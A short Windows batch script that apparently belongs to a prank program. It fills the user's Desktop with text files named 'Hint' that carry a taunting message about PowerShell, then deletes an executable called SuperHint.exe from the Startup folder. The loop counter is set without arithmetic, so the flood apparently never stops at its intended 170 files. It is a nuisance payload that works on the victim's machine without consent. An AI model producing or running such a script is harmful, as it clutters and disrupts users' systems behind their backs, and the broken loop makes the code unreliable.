@echo off
if not exist "%userprofile%\Onedrive" (cd %userprofile%\Desktop) else (cd %userprofile%\Onedrive\Desktop)
set /A a=0
:b
if %a% == 170 goto e
echo Think that, if cmd has disabled use powershell, right? > "Hint %random%.txt"
set a=%a% + 1
goto b
:e
cd 
del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SuperHint.exe"
